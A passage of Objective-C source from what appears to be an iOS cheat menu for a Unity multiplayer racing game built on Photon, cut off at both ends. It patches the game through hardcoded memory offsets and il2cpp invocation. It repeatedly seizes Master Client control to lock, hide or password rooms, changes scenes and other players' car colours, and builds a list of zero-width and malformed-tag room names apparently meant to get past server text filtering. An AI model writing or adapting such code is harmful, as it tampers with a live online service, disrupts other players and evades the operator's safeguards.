    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⏱️ Oyun Hızı"
        message:@"Oyun hızını seç (sadece senin ekranında):"
        preferredStyle:UIAlertControllerStyleAlert];

    NSArray *speeds = @[
        @{@"n": @"🐢  Çok Yavaş  (0.1x)",  @"v": @0.1f},
        @{@"n": @"🟡  Yavaş      (0.3x)",  @"v": @0.3f},
        @{@"n": @"🔵  Yavaşça    (0.5x)",  @"v": @0.5f},
        @{@"n": @"⚪  Normal     (1.0x)",  @"v": @1.0f},
        @{@"n": @"🟢  Hızlı      (2.0x)",  @"v": @2.0f},
        @{@"n": @"🟠  Çok Hızlı  (3.0x)",  @"v": @3.0f},
        @{@"n": @"🔴  Süper Hız  (5.0x)",  @"v": @5.0f},
        @{@"n": @"⭐  Max Turbo (10.0x)", @"v": @10.0f},
    ];

    for (NSDictionary *sp in speeds) {
        NSString *name = sp[@"n"];
        float val = [sp[@"v"] floatValue];
        [ac addAction:[UIAlertAction actionWithTitle:name style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            if (o_setTimeScale) o_setTimeScale(val);
            FLog([NSString stringWithFormat:@"⏱️ TimeScale: %.1fx", val]);
        }]];
    }

    // Ozel deger girme
    [ac addAction:[UIAlertAction actionWithTitle:@"✏️ Ozel Deger Gir" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        UIAlertController *inp = [UIAlertController alertControllerWithTitle:@"⏱️ Ozel Hız"
            message:@"Deger gir (ornek: 0.5 veya 3.0):" preferredStyle:UIAlertControllerStyleAlert];
        [inp addTextFieldWithConfigurationHandler:^(UITextField *tf){
            tf.keyboardType = UIKeyboardTypeDecimalPad;
            tf.placeholder = @"1.0";
        }];
        [inp addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a2){
            float v = [inp.textFields.firstObject.text floatValue];
            if (v > 0.0f && v <= 20.0f) {
                if (o_setTimeScale) o_setTimeScale(v);
                FLog([NSString stringWithFormat:@"⏱️ Ozel TimeScale: %.2fx", v]);
            }
        }]];
        [inp addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:inp];
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== FAKE CEVRIMICI SAYISI =====
- (void)tapFakeOnline {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👥 Fake Çevrimici Sayısı"
        message:@"Lobi oda listesindeki oyuncu sayılarını fake göster.\nSadece senin ekranında etkilidir."
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.keyboardType = UIKeyboardTypeNumberPad;
        tf.placeholder = @"Fake sayı (0 = kapat)";
        if (g_fakeOnlineCount > 0)
            tf.text = [NSString stringWithFormat:@"%d", g_fakeOnlineCount];
    }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *txt = ac.textFields.firstObject.text;
        g_fakeOnlineCount = [txt intValue];
        NSString *msg = g_fakeOnlineCount > 0
            ? [NSString stringWithFormat:@"👥 Fake sayı aktif: her oda %d gözükür.", g_fakeOnlineCount]
            : @"❌ Fake sayı kapatildi, gerçek sayılar görünür.";
        UIAlertController *r = [UIAlertController alertControllerWithTitle:@"👥 Fake Online"
            message:msg preferredStyle:UIAlertControllerStyleAlert];
        [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:r];
        FLog([NSString stringWithFormat:@"👥 FakeOnline: %d", g_fakeOnlineCount]);
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ODA KİLİTLE / AÇ =====
- (void)tapRoomLock {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔒 Oda Kilidi"
            message:@"Bu özellik için bir odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!room_setIsOpen) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔒 Oda Kilidi" message:@"room_setIsOpen pointer YOK — bu Photon versiyonu bunu desteklemez." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    // v99: Master 3x claim + kontrol (kick fix ile ayni mantik)
    few1n_claimMaster();
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        BOOL m = NO; if (pn_getLocalPlayer && ply_getIsMaster) { void* me = pn_getLocalPlayer(); if (me) m = ply_getIsMaster(me); }
        if (!m) { FLog(@"🔒 hala master degilim - 2. deneme"); few1n_claimMaster(); }
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        BOOL m = NO; if (pn_getLocalPlayer && ply_getIsMaster) { void* me = pn_getLocalPlayer(); if (me) m = ply_getIsMaster(me); }
        @try {
            void* room = pn_getCurrentRoom ? pn_getCurrentRoom() : NULL;
            if (!ptrOk(room)) { FLog(@"❌ Oda pointer alınamadı"); return; }
            bool isOpen = room_getIsOpen ? room_getIsOpen(room) : true;
            bool newVal  = !isOpen;
            room_setIsOpen(room, newVal);
            NSString *durum = newVal ? @"🔓 AÇIK — herkes girebilir" : @"🔒 KİLİTLİ — yeni kimse giremez";
            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🔒 Oda Kilidi"
                message:[NSString stringWithFormat:@"Oda: %@\nMaster: %@", durum, m ? @"EVET" : @"HAYIR (degisiklik geri alinabilir)"]
                preferredStyle:UIAlertControllerStyleAlert];
            [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:ac];
            FLog([NSString stringWithFormat:@"🔒 IsOpen: %d → %d master=%@", isOpen, newVal, m ? @"EVET":@"HAYIR"]);
        } @catch (...) { FLog(@"tapRoomLock exception"); }
    });
}

// ===== ODA GİZLE / GÖSTER =====
- (void)tapRoomHide {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"👁️ Oda Görünürlüğü"
            message:@"Bu özellik için bir odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    // Master Client ol
    few1n_claimMaster();
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        @try {
            void* room = pn_getCurrentRoom ? pn_getCurrentRoom() : NULL;
            if (!ptrOk(room)) { FLog(@"❌ Oda pointer alınamadı"); return; }
            bool isVis = room_getIsVisible ? room_getIsVisible(room) : true;
            bool newVal = !isVis;
            if (room_setIsVisible) {
                room_setIsVisible(room, newVal);
                NSString *durum = newVal ? @"👁️ GÖRÜNÜR — oda listesinde gözükür" : @"🙈 GİZLİ — oda listesinde görünmez";
                UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👁️ Oda Görünürlüğü"
                    message:[NSString stringWithFormat:@"Oda şu an: %@", durum]
                    preferredStyle:UIAlertControllerStyleAlert];
                [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:ac];
                FLog([NSString stringWithFormat:@"👁️ IsVisible: %d → %d", isVis, newVal]);
            } else { FLog(@"❌ room_setIsVisible pointer yok"); }
        } @catch (...) { FLog(@"tapRoomHide exception"); }
    });
}

// ===== ODA ŞİFRESİ KOY / KALDIR =====
// HR_PhotonLobbyManager.CreateRoomButton disassembly'sinde şifre, oda özelliği
// "pWd" olarak yazılıyor. Eski kodun "pwd" anahtarı oyunun EnterPassword
// metoduyla eşleşmediği için oda kartı şifreli görünmüyor ve girişte kontrol edilmiyordu.
static NSString* few1n_roomPasswordPropertyKey(void) {
    // Bu slot, CreateRoomButton'ın kullandığı il2cpp string literalidir. Oyun bu
    // sürümde henüz başlatmadıysa boş olur; dump ile doğrulanmış sabite döneriz.
    if (global_base) {
        void *keyObject = *(void **)(global_base + 0x8B1FE78);
        if (ptrOk(keyObject)) {
            NSString *key = readStr(keyObject);
            if ([key isEqualToString:@"pWd"]) return key;
        }
    }
    return @"pWd";
}

- (void)tapRoomPassword {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
            message:@"Önce kendi odanı kurup odaya gir." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }

    // Sunucu oda özelliklerini yalnızca mevcut Master Client'tan kabul eder.
    BOOL amMaster = NO;
    @try {
        void *me = pn_getLocalPlayer ? pn_getLocalPlayer() : NULL;
        amMaster = ptrOk(me) && ply_getIsMaster && ply_getIsMaster(me);
    } @catch (...) {}
    if (!amMaster) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
            message:@"Şifreyi yalnızca odanın sahibi (Master Client) değiştirebilir. Kendi kurduğun odada tekrar dene."
            preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!pn_getCurrentRoom || !g_hashtableClass || !few1n_ensureRoomApi()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
            message:@"Photon oda işlevleri henüz hazır değil. Lobiye dönüp tekrar dene."
            preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi Koy / Kaldır"
        message:@"Yeni şifreyi gir. Boş bırakırsan oda şifresiz olur."
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Şifre (boş = şifresiz)";
        tf.secureTextEntry = YES;
    }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *pwd = [ac.textFields.firstObject.text ?: @"" copy];
        @try {
            void *room = pn_getCurrentRoom();
            NSString *key = few1n_roomPasswordPropertyKey();
            void *ht = ptrOk(room) ? mkPhotonHashtable(@{ key : pwd }) : NULL;

            // v114.10: il2cpp runtime_invoke ile SetCustomProperties(pWd, expected=null, webFlags=null).
            // Eski hardcoded offset (0x5916158) yeni build'lerde PhotonNetwork.get_NickName'e
            // sapip sessiz fail ediyordu; isim ile bulmak drift-immune.
            bool accepted = false;
            if (ptrOk(room) && ht && g_mRoomSetCustomProperties && i_runtime_invoke) {
                void *args[3] = { ht, NULL, NULL };
                @try {
                    void *ret = i_runtime_invoke(g_mRoomSetCustomProperties, room, args, NULL);
                    // Boxed bool: Il2CppObject header (0x10) + value (bool byte)
                    if (ret) accepted = *(unsigned char*)((uintptr_t)ret + 0x10) != 0;
                } @catch (...) { FLog(@"🔑 SetCustomProperties exception"); }
            }

            // Yeni gelenlerin oda listesinde şifreyi görmesi için pWd'yi lobby'ye görünür
            // property'lere ekle. Zaten oradaysa no-op; değilse post-create update propagasyonu
            // için kritik (aksi halde HR_UI_RoomListLine.password @+0x50 boş kalır).
            if (accepted && g_mRoomSetPropertiesListedInLobby && i_runtime_invoke) {
                void *arr = mkStringArray1(key);
                if (arr) {
                    void *args2[1] = { arr };
                    @try {
                        i_runtime_invoke(g_mRoomSetPropertiesListedInLobby, room, args2, NULL);
                        FLog([NSString stringWithFormat:@"🔑 pWd propertiesListedInLobby'ye eklendi"]);
                    } @catch (...) { FLog(@"🔑 SetPropertiesListedInLobby exception"); }
                }
            }

            FLog([NSString stringWithFormat:@"🔑 Oda şifre isteği: key=%@, uzunluk=%lu → %s",
                  key, (unsigned long)pwd.length, accepted ? "KABUL" : "RED"]);

            if (!accepted) {
                UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
                    message:@"Şifre isteği sunucuya gönderilemedi. Odada hâlâ Master Client olduğundan emin olup tekrar dene."
                    preferredStyle:UIAlertControllerStyleAlert];
                [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:e];
                return;
            }

            // Menünün sonraki açılışında da son ayarı hatırlat; yalnızca başarılı
            // sunucu isteğinden sonra güncellenir.
            strncpy(roomPasswordText, pwd.UTF8String ?: "", sizeof(roomPasswordText) - 1);
            roomPasswordText[sizeof(roomPasswordText) - 1] = '\0';
            saveStr(@"roomPass", pwd);

            // Oyunun iki TMP alanını da eşitle; bu, lobi panelinin doğru durumu
            // göstermesini sağlar fakat asıl koruma yukarıdaki sunucu özelliğidir.
            if (lobbyGetInst && tmp_set_text) {
                void *lobby = lobbyGetInst();
                if (ptrOk(lobby)) {
                    void *pwdInput = *(void **)((uintptr_t)lobby + OFF_LOBBY_PWD_INPUT);
                    void *pwdOnConnect = *(void **)((uintptr_t)lobby + OFF_LOBBY_PWD_ON_CONN_INPUT);
                    void *pwdStr = mkStr(pwd);
                    if (ptrOk(pwdStr)) {
                        if (ptrOk(pwdInput)) tmp_set_text(pwdInput, pwdStr);
                        if (ptrOk(pwdOnConnect)) tmp_set_text(pwdOnConnect, pwdStr);
                    }
                }
            }

            NSString *msg = pwd.length > 0
                ? @"Şifre ayarlandı. Odaya sonradan girecek kişilerden oyun şifre isteyecek."
                : @"Şifre kaldırıldı. Oda artık şifresiz.";
            UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
                message:msg preferredStyle:UIAlertControllerStyleAlert];
            [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:r];
        } @catch (...) {
            FLog(@"❌ tapRoomPassword exception");
            UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🔑 Oda Şifresi"
                message:@"Şifre ayarlanırken beklenmeyen bir hata oluştu." preferredStyle:UIAlertControllerStyleAlert];
            [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:e];
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== HAVA DURUMU & ZAMAN SEÇ =====
- (void)changeWeatherOnly {
    few1n_claimMaster();

    // Mevcut haritanin BASE ismini al: "Desert Night" -> "Desert", "Highway Rainy" -> "Highway"
    NSString *cur = (pn_getActiveSceneName) ? readStr(pn_getActiveSceneName()) : @"Highway";
    if (!cur || cur.length == 0) cur = @"Highway";
    NSString *base = cur;
    for (NSString *sfx in @[@" Sunset", @" Night", @" Rainy", @" Snow", @" Sunrise"]) {
        if ([base hasSuffix:sfx]) { base = [base substringToIndex:base.length - sfx.length]; break; }
    }
    NSString *baseCopy = [base copy];

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🌤️ Canlı Hava Durumu & Zaman"
        message:[NSString stringWithFormat:@"Mevcut harita: %@\nYalnızca zamanı/havayı değiştirir (harita KORUNUR):", base]
        preferredStyle:UIAlertControllerStyleAlert];

    // "" = base (default gunduz), "sfx" = variant. Dinamik olarak base + suffix birlestirilir.
    NSArray *weathers = @[
        @{@"name": @"☀️ GÜNDÜZ / Güneşli", @"sfx": @""},
        @{@"name": @"🌅 GÜN BATIMI",       @"sfx": @" Sunset"},
        @{@"name": @"🌙 GECE",             @"sfx": @" Night"},
        @{@"name": @"🌧️ YAĞMURLU & SİSLİ", @"sfx": @" Rainy"},
        @{@"name": @"❄️ KAR",              @"sfx": @" Snow"},
    ];

    for (NSDictionary *w in weathers) {
        NSString *wName  = w[@"name"];
        NSString *wSfx   = w[@"sfx"];
        NSString *target = [baseCopy stringByAppendingString:wSfx];

        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%@   (%@)", wName, target]
            style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            NSString *tgt = target;
            FLog([NSString stringWithFormat:@"🌤️ HAVA: %@ -> yukleniyor '%@'", wName, tgt]);
            @try {
                if (pn_loadLevelStr) {
                    void* s = mkStr(tgt);
                    if (s) { pn_loadLevelStr(s); FLog(@"🌤️ LoadLevel ile gonderildi"); return; }
                }
                if (lobbySetScene && lobbyGetInst) {
                    void* lobby = lobbyGetInst();
                    if (ptrOk(lobby)) {
                        void* s = mkStr(tgt);
                        if (s) { lobbySetScene(lobby, s); FLog(@"🌤️ SetScene ile gonderildi"); return; }
                    }
                }
                if (photonMgrEnp) {
                    void* s = mkStr(tgt);
                    if (s) { photonMgrEnp(s, false); FLog(@"🌤️ enp ile gonderildi"); }
                }
            } @catch (...) { FLog(@"🌤️ Exception"); }
        }]];
    }

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ODADAKİ TÜM ARAÇLARIN RENGİNİ SEÇ & BOYA (ODA DEĞİŞSE DE KALICI) =====
static bool isCarPaintActive = false;
static char customCarPaintHex[32] = "#FF0000";

- (void)pickCarPaintColor {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎨 Odadaki Araçların Rengini Seç & Boya"
        message:@"Odadaki tüm oyuncuların araç rengini ayarla (Oda değişse de renk tercihin aktif kalır):" preferredStyle:UIAlertControllerStyleAlert];

    NSArray *colors = @[
        @{@"name": @"🔴 Alev Kırmızı (Neon Red)", @"hex": @"#FF0000"},
        @{@"name": @"🟢 Neon Yeşil (Neon Green)", @"hex": @"#00FF00"},
        @{@"name": @"🩵 Siber Turkuaz (Cyan)", @"hex": @"#00FFFF"},
        @{@"name": @"🟣 Gece Moru (Neon Purple)", @"hex": @"#AA00FF"},
        @{@"name": @"🟡 Altın Sarısı (Gold)", @"hex": @"#FFD700"},
        @{@"name": @"🖤 Mat Siyah (Matte Black)", @"hex": @"#111111"},
        @{@"name": @"⚪ Kristal Beyaz (Crystal White)", @"hex": @"#FFFFFF"}
    ];

    for (NSDictionary *c in colors) {
        NSString *cName = c[@"name"];
        NSString *cHex  = c[@"hex"];
        [ac addAction:[UIAlertAction actionWithTitle:cName style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            strncpy(customCarPaintHex, cHex.UTF8String, sizeof(customCarPaintHex)-1);
            isCarPaintActive = true;
            saveBool(@"carPaintActive", true);
            saveStr(@"carPaintHex", cHex);

            // Chate oda içi araç rengi değişim bildirimi gönder
            if (chatGetInst && chatSend) {
                NSString *notice = [NSString stringWithFormat:@"<color=%@><b>[PAINT] Odadaki Tüm Araçlar Yeni Renge Boyandı! (%@)</b></color>", cHex, cName];
                void* mgr = chatGetInst(); void* s = mkStr(notice);
                if (mgr && s) chatSend(mgr, s);
            }
            FLog([NSString stringWithFormat:@"🎨 Araç rengi ayarlandı: %@ (%@)", cName, cHex]);
        }]];
    }

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Veya Özel HEX Kodu (Örn: #FF0055)";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula (Yazılan HEX)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *hex = ac.textFields.firstObject.text;
        if (hex && hex.length > 0) {
            if (![hex hasPrefix:@"#"]) hex = [@"#" stringByAppendingString:hex];
            strncpy(customCarPaintHex, hex.UTF8String, sizeof(customCarPaintHex)-1);
            isCarPaintActive = true;
            saveBool(@"carPaintActive", true);
            saveStr(@"carPaintHex", hex);

            if (chatGetInst && chatSend) {
                NSString *notice = [NSString stringWithFormat:@"<color=%@><b>[PAINT] Odadaki Tüm Araçlar Özel Renge Boyandı! (%@)</b></color>", hex, hex];
                void* mgr = chatGetInst(); void* s = mkStr(notice);
                if (mgr && s) chatSend(mgr, s);
            }
            FLog([NSString stringWithFormat:@"🎨 Özel araç rengi ayarlandı: %@", hex]);
        }
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🔄 Boyayı Sıfırla" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        isCarPaintActive = false;
        saveBool(@"carPaintActive", false);
        FLog(@"Araç rengi orijinaline sıfırlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)pickRoomMax:(UIButton*)b {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F465 Oda Max Oyuncu"
        message:@"Kac kisilik? Istedigin sayiyi yaz (2-255):" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.keyboardType = UIKeyboardTypeNumberPad;
        tf.text = [NSString stringWithFormat:@"%d", roomMaxPlayers];
        tf.placeholder = @"31";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        int v = [ac.textFields.firstObject.text intValue];
        if (v < 2)   v = 2;
        if (v > 255) v = 255;
        roomMaxPlayers = v;
        saveInt(@"roomMaxP", roomMaxPlayers);
        [b setTitle:[NSString stringWithFormat:@"\U0001F465 Oda Max Oyuncu: %d", roomMaxPlayers] forState:UIControlStateNormal];
        FLog([NSString stringWithFormat:@"Oda max oyuncu: %d (elle)", roomMaxPlayers]);
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== GELISMIS RENKLI ODA KURUCU =====
- (void)createColoredRoom {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎨 Renkli Oda Kurucu (TMPro Compatible)"
                                                               message:@"Oda listenizde ve oyunda CANLI renkle görünecek stili seçin:"
                                                        preferredStyle:UIAlertControllerStyleAlert];

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = @"FEW1N";
        tf.placeholder = @"Oda İsmi Girin";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    void (^buildAndCreate)(NSString*, NSString*) = ^(NSString *prefix, NSString *suffix){
        NSString *input = ac.textFields.firstObject.text;
        if (!input || input.length == 0) input = @"FEW1N";
        NSString *formatted = [NSString stringWithFormat:@"%@%@%@", prefix, input, suffix];
        strncpy(customRoomName, formatted.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1]='\0';
        saveStr(@"roomName", formatted);
        isColorRoomForce = true;
        saveBool(@"colorroomforce", true);
        FLog([NSString stringWithFormat:@"🎨 Renkli oda kuruluyor: %@", formatted]);
        [self createOneRoom];
    };

    // ==== STANDART TEMİZ RENKLER (Short Hex - TMPro %100 Uyumlu) ====
    [ac addAction:[UIAlertAction actionWithTitle:@"🔴 Canlı Kırmızı (<#FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF0000><b>", @"</b>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🟢 Neon Yeşil (<#00FF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FF00><b>", @"</b>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🔵 Buz Mavisi (<#00FFFF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FFFF><b>", @"</b>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🟡 Parlak Sarı (<#FFFF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FFFF00><b>", @"</b>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🟣 Pembe / Mor (<#FF00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF00FF><b>", @"</b>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🟠 Turuncu (<#FF7F00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF7F00><b>", @"</b>"); }]];

    // ==== GÖKKUŞAĞI (RAINBOW) HARF HARF RENK ====
    [ac addAction:[UIAlertAction actionWithTitle:@"🌈 Gökkuşağı (Rainbow Harfler)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *input = ac.textFields.firstObject.text;
        if (!input || input.length == 0) input = @"FEW1N";
        NSArray *cols = @[@"#FF0000", @"#FF7F00", @"#FFFF00", @"#00FF00", @"#00FFFF", @"#4466FF", @"#FF00FF"];
        NSMutableString *rainbow = [NSMutableString string];
        for (NSUInteger i = 0; i < input.length; i++) {
            NSString *ch = [input substringWithRange:NSMakeRange(i,1)];
            [rainbow appendFormat:@"<%@><b>%@</b>", cols[i % cols.count], ch];
        }
        strncpy(customRoomName, rainbow.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1]='\0';
        saveStr(@"roomName", rainbow);
        isColorRoomForce = true;
        saveBool(@"colorroomforce", true);
        FLog([NSString stringWithFormat:@"🌈 Rainbow renkli oda kuruluyor: %@", rainbow]);
        [self createOneRoom];
    }]];

    // ==== ÖZEL TMPro STİLLERİ ====
    [ac addAction:[UIAlertAction actionWithTitle:@"🔥 Kırmızı Arka Plan Vurgu (<mark>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<mark=#FF0000AA><#FFFFFF><b>", @"</b></mark>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ Dev Kırmızı Yazı (<size=150%>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<size=150%><#FF0000><b>", @"</b></size>"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"✨ Mavi Vurgu + İtalik" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<mark=#00FFFF44><#00FFFF><i><b>", @"</b></i></mark>"); }]];

    // ==== RICH TEXT FİLTRESİZ (%100 RENKLİ EMOJI & UNICODE ÇERÇEVELER) ====
    // Sunucu HTML/RichText etiketlerini silse bile bu seçenekler HER CİHAZDA %100 CANLI RENKLİ GÖRÜNÜR!
    [ac addAction:[UIAlertAction actionWithTitle:@"🔴🟡🔵 Renkli Emoji Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"🔴🟡🔵 ", @" 🔵🟡🔴"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ VIP Alev Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"⚡🔥 <b>", @"</b> 🔥⚡"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"👑 Kral Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"👑 <b>", @"</b> 👑"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"░▒▓ VIP Gölgeli Çerçeve (Unicode)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"░▒▓ <b>", @"</b> ▓▒░"); }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"【★ Kutu Çerçeveli ★】" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"【★ <b>", @"</b> ★】"); }]];

    // ==== BRUTE FORCE: TUM TEKNIKLERI TEK SEFERDE DENE ====
    [ac addAction:[UIAlertAction actionWithTitle:@"🚀 BRUTE FORCE (20+ Teknik)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        NSString *input = ac.textFields.firstObject.text;
        if (!input || input.length == 0) input = @"FEW1N";
        g_bruteForceNames = @[
            [NSString stringWithFormat:@"<#FF0000><b>%@</b>", input],
            [NSString stringWithFormat:@"<#00FF00><b>%@</b>", input],
            [NSString stringWithFormat:@"<#00FFFF><b>%@</b>", input],
            [NSString stringWithFormat:@"<#FFFF00><b>%@</b>", input],
            [NSString stringWithFormat:@"<#FF00FF><b>%@</b>", input],
            [NSString stringWithFormat:@"<COLOR=#FF0000><b>%@</b></COLOR>", input],
            [NSString stringWithFormat:@"<CoLoR=#FF0000><b>%@</b></CoLoR>", input],
            [NSString stringWithFormat:@"<c\u200Bolor=#FF0000><b>%@</b></c\u200Bolor>", input],
            [NSString stringWithFormat:@"<c\u00ADolor=#FF0000><b>%@</b></c\u00ADolor>", input],
            [NSString stringWithFormat:@"<#F00><b>%@</b>", input],
            [NSString stringWithFormat:@"<mark=#FF0000AA><b>%@</b></mark>", input],
            [NSString stringWithFormat:@"<size=160%%><#FF0000><b>%@</b></size>", input],
            [NSString stringWithFormat:@"<col<color=#FF0000>or=#FF0000><b>%@</b>", input],
            [NSString stringWithFormat:@"\u200F<#FF0000><b>%@</b>", input],
            [NSString stringWithFormat:@"<C\u200BOLOR=#FF0000><mark=#FF000044><b>%@</b></mark></C\u200BOLOR>", input],
            [NSString stringWithFormat:@"🔴🟡🔵 %@ 🔵🟡🔴", input],
